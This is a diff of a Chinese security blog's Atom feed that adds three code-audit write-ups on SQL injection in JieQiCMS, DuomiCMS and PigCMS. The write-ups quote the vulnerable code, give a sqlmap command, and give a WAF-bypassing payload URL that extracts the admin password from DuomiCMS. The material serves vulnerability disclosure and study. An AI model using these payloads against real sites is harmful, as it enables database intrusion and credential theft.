@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://goodwaf.com/"/>
-  <updated>2017-01-03T03:54:02.928Z</updated>
+  <updated>2017-04-13T06:20:46.307Z</updated>
   <id>http://goodwaf.com/</id>
   
   <author>
@@ -14,6 +14,97 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>JieQiCMS(V1.7)无需登录SQL注入</title>
+    <link href="http://goodwaf.com/2017/02/18/jieqicms_sqli/"/>
+    <id>http://goodwaf.com/2017/02/18/jieqicms_sqli/</id>
+    <published>2017-02-18T09:22:01.000Z</published>
+    <updated>2017-04-13T06:20:46.307Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h4><p>在官网下载了jieqicms，发现使用了zend加密，通过dzend后发现一处update延时注入。在审计的时候发现这套系统不仅安全防范做的不错还对源码加了密，但是感觉作者在对update类型的数据库查询时并没有做较多防范。</p>
+<a id="more"></a>
+<h4 id="二、漏洞详情"><a href="#二、漏洞详情" class="headerlink" title="二、漏洞详情"></a>二、漏洞详情</h4><p>因为dzend后很多乱码，所以就直接上注入点。漏洞文件在：\modules\article\readbookcase..php中的32行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$bookcase_handler-&gt;db-&gt;query( <span class="string">"UPDATE "</span>.jieqi_dbprefix( <span class="string">"article_bookcase"</span> ).<span class="string">" SET lastvisit="</span>.JIEQI_NOW_TIME.<span class="string">" WHERE caseid="</span>.$_REQUEST[<span class="string">'bid'</span>] );</div></pre></td></tr></table></figure></p>
+<p>虽然程序在入口处对所有参数都进行了addslashes，但在构造sql语句时没有单引号保护导致sql注入。</p>
+<h4 id="三、漏洞证明"><a href="#三、漏洞证明" class="headerlink" title="三、漏洞证明"></a>三、漏洞证明</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u <span class="string">"http://192.168.77.132/modules/article/readbookcase.php?aid=1&amp;bid=1"</span> -p bid --dbms mysql</div></pre></td></tr></table></figure>
+<h4 id="四、其它"><a href="#四、其它" class="headerlink" title="四、其它"></a>四、其它</h4><p>在审计的时候还发现了其它几个地方可能有update注入，但是没有继续验证了。直接在源码里找update类型的sql查询应该还能找几个注入点出来。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;一、背景&quot;&gt;&lt;a href=&quot;#一、背景&quot; class=&quot;headerlink&quot; title=&quot;一、背景&quot;&gt;&lt;/a&gt;一、背景&lt;/h4&gt;&lt;p&gt;在官网下载了jieqicms，发现使用了zend加密，通过dzend后发现一处update延时注入。在审计的时候发现这套系统不仅安全防范做的不错还对源码加了密，但是感觉作者在对update类型的数据库查询时并没有做较多防范。&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>DuomiCMS前台SQL注入</title>
+    <link href="http://goodwaf.com/2017/01/16/duomicms_sqli/"/>
+    <id>http://goodwaf.com/2017/01/16/duomicms_sqli/</id>
+    <published>2017-01-16T02:13:20.000Z</published>
+    <updated>2017-04-13T06:20:41.043Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h4><ol>
+<li>duomicms在SQL防注入方面做了2层安全检测，第一层检测是在代码入口处，使用了360的简易WAF规则。第二层是在数据库查询入口处使用了dedecms的SQL检测函数。</li>
+<li>duomicms使用了伪全局变量，对GET/POST/COOKIE中的变量做了addslashes</li>
+</ol>
+<a id="more"></a>
+<p>由上可知要完成注入的必要条件有：</p>
+<ol>
+<li>注入点无单引号保护</li>
+<li>绕过文件入口处的360WAF规则和数据库查询入口处的dedecms SQL检查函数。</li>
+</ol>
+<h4 id="二、注入点"><a href="#二、注入点" class="headerlink" title="二、注入点"></a>二、注入点</h4><p>/interface/comment/api/index.php文件中的Readrlist函数:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Readrlist</span><span class="params">($ids,$page,$size)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">global</span> $dsql,$type;</div><div class="line">        $rl=<span class="keyword">array</span>();</div><div class="line">        $sql = <span class="string">"SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM duomi_comment WHERE m_type=$type AND id in ($ids) ORDER BY id DESC"</span>;</div><div class="line">        $dsql-&gt;setQuery($sql);</div><div class="line">        $dsql-&gt;Execute(<span class="string">'commentrlist'</span>);</div><div class="line">        <span class="keyword">while</span>($row=$dsql-&gt;GetArray(<span class="string">'commentrlist'</span>))</div><div class="line">        &#123;</div><div class="line">                $rl[]=<span class="string">"\""</span>.$row[<span class="string">'id'</span>].<span class="string">"\":&#123;\"uid\":"</span>.$row[<span class="string">'uid'</span>].<span class="string">",\"tmp\":\"\",\"nick\":\""</span>.$row[<span class="string">'username'</span>].<span class="string">"\",\"face\":\"\",\"star\":\"\",\"anony\":"</span>.(<span class="keyword">empty</span>($row[<span class="string">'username'</span>])?<span class="number">1</span>:<span class="number">0</span>).<span class="string">",\"from\":\""</span>.$row[<span class="string">'username'</span>].<span class="string">"\",\"time\":\""</span>.$row[<span class="string">'dtime'</span>].<span class="string">"\",\"reply\":\""</span>.$row[<span class="string">'reply'</span>].<span class="string">"\",\"content\":\""</span>.$row[<span class="string">'msg'</span>].<span class="string">"\",\"agree\":"</span>.$row[<span class="string">'agree'</span>].<span class="string">",\"aginst\":"</span>.$row[<span class="string">'anti'</span>].<span class="string">",\"pic\":\""</span>.$row[<span class="string">'pic'</span>].<span class="string">"\",\"vote\":\""</span>.$row[<span class="string">'vote'</span>].<span class="string">"\",\"allow\":\""</span>.(<span class="keyword">empty</span>($row[<span class="string">'anti'</span>])?<span class="number">0</span>:<span class="number">1</span>).<span class="string">"\",\"check\":\""</span>.$row[<span class="string">'ischeck'</span>].<span class="string">"\"&#125;"</span>;</div><div class="line">        &#125;</div><div class="line">        $readrlist=join($rl,<span class="string">","</span>);</div><div class="line">        <span class="keyword">return</span> $readrlist;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>从sql语句中可以看出ids参数被带入in操作符，但是没有单引号保护，再看调用Readrlist函数的地方:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReadData</span><span class="params">($id,$page)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">global</span> $type,$pCount,$rlist;</div><div class="line">        $ret = <span class="keyword">array</span>(<span class="string">""</span>,<span class="string">""</span>,$page,<span class="number">0</span>,<span class="number">10</span>,$type,$id);</div><div class="line">        <span class="keyword">if</span>($id&gt;<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">                $ret[<span class="number">0</span>] = Readmlist($id,$page,$ret[<span class="number">4</span>]);</div><div class="line">                $ret[<span class="number">3</span>] = $pCount;</div><div class="line">                $x = implode(<span class="string">','</span>,$rlist);</div><div class="line">                <span class="keyword">if</span>(!<span class="keyword">empty</span>($x))</div><div class="line">                &#123;</div><div class="line">                $ret[<span class="number">1</span>] = Readrlist($x,<span class="number">1</span>,<span class="number">10000</span>);</div><div class="line">                &#125;</div><div class="line">        &#125;       </div><div class="line">        $readData = FormatJson($ret);</div><div class="line">        <span class="keyword">return</span> $readData;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以看出注入点ids来自全局变量rlist,而rlist参数是用户可以控制的，由此造成注入。</p>
+<h4 id="三、规则绕过"><a href="#三、规则绕过" class="headerlink" title="三、规则绕过"></a>三、规则绕过</h4><p>具体绕过参考之前的文章《DedeCMS CheckSql函数绕过》。通过构造如下payload即可绕过两处规则检测：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/interface/comment/api/index.php?gid=1&amp;page=2&amp;rlist[0]=`'`.``.id, extractvalue(1, concat_ws(0x20, 0x5c,(select`password` from duomi_admin limit 1))),`'`.``.id</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;一、背景&quot;&gt;&lt;a href=&quot;#一、背景&quot; class=&quot;headerlink&quot; title=&quot;一、背景&quot;&gt;&lt;/a&gt;一、背景&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;duomicms在SQL防注入方面做了2层安全检测，第一层检测是在代码入口处，使用了360的简易WAF规则。第二层是在数据库查询入口处使用了dedecms的SQL检测函数。&lt;/li&gt;
+&lt;li&gt;duomicms使用了伪全局变量，对GET/POST/COOKIE中的变量做了addslashes&lt;/li&gt;
+&lt;/ol&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>PigCMS前台SQL注入</title>
+    <link href="http://goodwaf.com/2017/01/05/pigcms_sqli/"/>
+    <id>http://goodwaf.com/2017/01/05/pigcms_sqli/</id>
+    <published>2017-01-05T10:43:12.000Z</published>
+    <updated>2017-04-13T06:20:51.419Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h4><p>这个洞是很久以前刚学习代码审计的时候发现的，其中还找到了一个thinkPHP的漏洞，虽然后来发现p牛很早就已经公布了这个洞，但是作为刚入门时独立挖到的还是留个纪念吧，BTW，这篇文章的重点并不在PigCMS，因为这个系统的漏洞实在太多了。</p>
+<a id="more"></a>
+<h4 id="二、漏洞详情"><a href="#二、漏洞详情" class="headerlink" title="二、漏洞详情"></a>二、漏洞详情</h4><ul>
+<li>GPC == OFF</li>
+</ul>
+<p>首先定位到问题文件：PigCms\Lib\Action\Home\OpenApiAction.class.php<br>函数内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_access_token</span><span class="params">()</span></span>&#123;</div><div class="line">	$post 	= <span class="keyword">array</span>(</div><div class="line">		<span class="string">'appid'</span> 		=&gt; <span class="keyword">$this</span>-&gt;_post(<span class="string">'appid'</span>,<span class="string">'trim'</span>),</div><div class="line">	);</div><div class="line">	$info 	= M(<span class="string">'Wxuser'</span>)-&gt;where(<span class="string">"appid='&#123;$post['appid']&#125;'"</span>)-&gt;getField(<span class="string">'id'</span>);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($info)) &#123;</div><div class="line">		$return 	= <span class="keyword">array</span>(</div><div class="line">			<span class="string">'errCode'</span> 	=&gt; <span class="number">10001</span>,</div><div class="line">			<span class="string">'errMsg'</span> 	=&gt; <span class="string">'无效的appid'</span>,</div><div class="line">		);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$apiOauth 		= <span class="keyword">new</span> apiOauth();</div><div class="line">		$access_token  	= 					   $apiOauth-&gt;update_authorizer_access_token($post[<span class="string">'appid'</span>]);</div><div class="line">		$return 	= <span class="keyword">array</span>(</div><div class="line">			<span class="string">'errCode'</span> 	=&gt; <span class="number">0</span>,</div><div class="line">			<span class="string">'errMsg'</span> 	=&gt; <span class="string">'success'</span>,</div><div class="line">			<span class="string">'access_token'</span> 	=&gt; $access_token,</div><div class="line">		);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">echo</span> json_encode($return);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>该函数未经任何过滤就将appid传递给了where函数，再来看where函数内容（该函数是由TinkPHP提供的SQL语句构建函数）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span><span class="params">($where,$parse=null)</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(!is_null($parse) &amp;&amp; is_string($where)) &#123;</div><div class="line">            <span class="keyword">if</span>(!is_array($parse)) &#123;</div><div class="line">                $parse = func_get_args();</div><div class="line">                array_shift($parse);</div><div class="line">            &#125;</div><div class="line">            $parse = array_map(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;db,<span class="string">'escapeString'</span>),$parse);</div><div class="line">            $where =   vsprintf($where,$parse);</div><div class="line">        &#125;<span class="keyword">elseif</span>(is_object($where))&#123;</div><div class="line">            $where  =   get_object_vars($where);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'where'</span>] =   $where;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>可以看到传递进来的where变量是一个字符串，并且parse参数为null，所以即不满足if语句也不满足elseif语句，直接将where变量赋值给了options数组。完成了where函数接下来看getField函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getField</span><span class="params">($field,$sepa=null)</span> </span>&#123;</div><div class="line">    $options[<span class="string">'field'</span>]       =   $field;</div><div class="line">    $options                =   <span class="keyword">$this</span>-&gt;_parseOptions($options);</div><div class="line">    $field                  =   trim($field);</div><div class="line">    <span class="keyword">if</span>(strpos($field,<span class="string">','</span>)) &#123; <span class="comment">// 多字段</span></div><div class="line">        $options[<span class="string">'limit'</span>]   =   is_numeric($sepa)?$sepa:<span class="string">''</span>;</div><div class="line">        $resultSet          =   <span class="keyword">$this</span>-&gt;db-&gt;select($options);</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($resultSet)) &#123;</div><div class="line">            $_field         =   explode(<span class="string">','</span>, $field);</div><div class="line">            $field          =   array_keys($resultSet[<span class="number">0</span>]);</div><div class="line">            $key            =   array_shift($field);</div><div class="line">            $key2           =   array_shift($field);</div><div class="line">            $cols           =   <span class="keyword">array</span>();</div><div class="line">            $count          =   count($_field);</div><div class="line">            <span class="keyword">foreach</span> ($resultSet <span class="keyword">as</span> $result)&#123;</div><div class="line">                $name   =  $result[$key];</div><div class="line">                <span class="keyword">if</span>(<span class="number">2</span>==$count) &#123;</div><div class="line">                    $cols[$name]   =  $result[$key2];</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    $cols[$name]   =  is_string($sepa)?implode($sepa,array_slice($result,<span class="number">1</span>)):$result;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> $cols;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;   <span class="comment">// 查找一条记录</span></div><div class="line">        <span class="comment">// 返回数据个数</span></div><div class="line">        <span class="keyword">if</span>(<span class="keyword">true</span> !== $sepa) &#123;<span class="comment">// 当sepa指定为true的时候 返回所有数据</span></div><div class="line">            $options[<span class="string">'limit'</span>]   =   is_numeric($sepa)?$sepa:<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        $result = <span class="keyword">$this</span>-&gt;db-&gt;select($options);</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($result)) &#123;</div><div class="line">            <span class="keyword">if</span>(<span class="keyword">true</span> !== $sepa &amp;&amp; <span class="number">1</span>==$options[<span class="string">'limit'</span>]) <span class="keyword">return</span> reset($result[<span class="number">0</span>]);</div><div class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $val)&#123;</div><div class="line">                $array[]    =   $val[$field];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> $array;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>由于getField函数调用的地方只传递进来一个id参数，因此程序进入else分支并到达数据库查询语句处：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$result = <span class="keyword">$this</span>-&gt;db-&gt;select($options);</div></pre></td></tr></table></figure></p>
+<p>db变量是ThinkPHP自建的数据库查询对象，通过处理options数组提供的各项参数构造好语句后就传递给MySQL执行。由此造成了SQL注入。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;一、背景&quot;&gt;&lt;a href=&quot;#一、背景&quot; class=&quot;headerlink&quot; title=&quot;一、背景&quot;&gt;&lt;/a&gt;一、背景&lt;/h4&gt;&lt;p&gt;这个洞是很久以前刚学习代码审计的时候发现的，其中还找到了一个thinkPHP的漏洞，虽然后来发现p牛很早就已经公布了这个洞，但是作为刚入门时独立挖到的还是留个纪念吧，BTW，这篇文章的重点并不在PigCMS，因为这个系统的漏洞实在太多了。&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>基于约束条件的SQL攻击</title>
